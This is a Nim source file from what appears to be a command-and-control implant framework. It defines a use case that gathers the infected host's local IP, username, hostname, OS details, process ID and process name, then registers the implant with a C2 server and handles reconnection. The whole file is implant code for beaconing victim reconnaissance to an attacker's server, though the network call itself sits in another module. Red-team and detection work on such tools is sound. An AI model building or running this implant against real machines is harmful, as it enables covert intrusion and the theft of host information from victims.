#[
    Use Case: RegisterImplantUseCase
    Orchestrates implant registration with C2 server
    Applies Single Responsibility Principle
    
    Uses concrete repositories that implement the ports defined in domain/ports/out/.
    This is valid in hexagonal architecture - use cases can use concrete implementations
    that implement the ports, ensuring dependency inversion at the conceptual level.
]#

import ../../domain/models/implant
import ../../infrastructure/repositories/communication_repository
import ../../infrastructure/repositories/system_info_repository
import asyncdispatch

type
    RegisterImplantUseCase* = object
        communicationRepo*: CommunicationRepository
        systemInfoRepo*: SystemInfoRepository
    
proc newRegisterImplantUseCase*(communicationRepo: CommunicationRepository, 
                                systemInfoRepo: SystemInfoRepository): RegisterImplantUseCase =
    ## Create a new RegisterImplantUseCase instance
    result = RegisterImplantUseCase(
        communicationRepo: communicationRepo,
        systemInfoRepo: systemInfoRepo
    )

proc register*(useCase: RegisterImplantUseCase, implant: Implant): Future[(bool, Implant)] {.async.} =
    ## Register implant with C2 server
    ## Returns (success, updatedImplant)
    when defined debug:
        echo "[DEBUG] RegisterImplantUseCase: Registering implant..."
    
    var updatedImplant = implant
    
    # Get system information
    let localIP = useCase.systemInfoRepo.getLocalIP()
    let username = useCase.systemInfoRepo.getUsername()
    let hostname = useCase.systemInfoRepo.getHostname()
    let osInfo = useCase.systemInfoRepo.getOSInfo()
    let pid = useCase.systemInfoRepo.getCurrentPID()
    let processName = useCase.systemInfoRepo.getCurrentProcessName()
    
    # Determine role string
    let roleStr = case updatedImplant.role:
        of STANDARD: "STANDARD"
        of RELAY_CLIENT: "RELAY_CLIENT"
        of RELAY_SERVER: "RELAY_SERVER"
    
    # Register with C2 server
    let (success, registeredImplant) = await useCase.communicationRepo.registerWithC2(
        updatedImplant,
        localIP,
        username,
        hostname,
        osInfo,
        pid,
        processName,
        updatedImplant.isRelayMode(),
        roleStr
    )
    
    if success:
        updatedImplant = registeredImplant  # Use the returned implant which includes the ID
        updatedImplant.registered = true
        when defined debug:
            echo "[DEBUG] RegisterImplantUseCase: Implant registered successfully with ID: " & updatedImplant.id
    else:
        when defined debug:
            echo "[DEBUG] RegisterImplantUseCase: Failed to register implant"
    
    return (success, updatedImplant)

proc reconnect*(useCase: RegisterImplantUseCase, implant: var Implant): Future[bool] {.async.} =
    ## Reconnect implant to C2 server
    when defined debug:
        echo "[DEBUG] RegisterImplantUseCase: Reconnecting implant..."
    
    # Attempt reconnection
    let success = await useCase.communicationRepo.reconnectToC2(implant)
    
    if success:
        implant.registered = true
        when defined debug:
            echo "[DEBUG] RegisterImplantUseCase: Implant reconnected successfully"
    else:
        when defined debug:
            echo "[DEBUG] RegisterImplantUseCase: Failed to reconnect implant"
    
    return success

